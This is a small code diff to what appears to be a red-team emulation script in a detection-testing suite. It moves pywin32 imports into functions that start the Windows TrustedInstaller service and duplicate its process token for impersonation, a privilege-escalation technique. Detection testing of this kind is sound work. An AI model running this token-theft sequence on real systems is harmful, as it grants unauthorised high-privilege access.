@@ -5,7 +5,7 @@
 
 from . import common
 from . import RtaMetadata
-import ctypes, win32gui, win32process, win32event, win32api, win32security, win32file, win32service, sys, time, os
+
 
 metadata = RtaMetadata(
     uuid="6373e944-52c8-4199-8ca4-e88fd6361b9c",
@@ -20,6 +20,7 @@ metadata = RtaMetadata(
 
 def startsvc_trustedinstaller():
     try:
+       import win32service
        hscm = win32service.OpenSCManager(None,None,win32service.SC_MANAGER_ALL_ACCESS)
        hs = win32service.OpenService(hscm, "TrustedInstaller", win32service.SERVICE_START)
        win32service.StartService(hs, "30")
@@ -33,6 +34,7 @@ def startsvc_trustedinstaller():
 
 def impersonate_trusted_installer():
     try:
+        import win32api, win32security, win32file
         hp = win32api.OpenProcess(common.PROCESS_QUERY_LIMITED_INFORMATION, 0, common.getppid("TrustedInstaller.exe"))
         th = win32security.OpenProcessToken(hp, common.TOKEN_ALL_ACCESS)
         new_tokenh = win32security.DuplicateTokenEx(th, 2, common.TOKEN_ALL_ACCESS , win32security.TokenImpersonation , win32security.SECURITY_ATTRIBUTES())
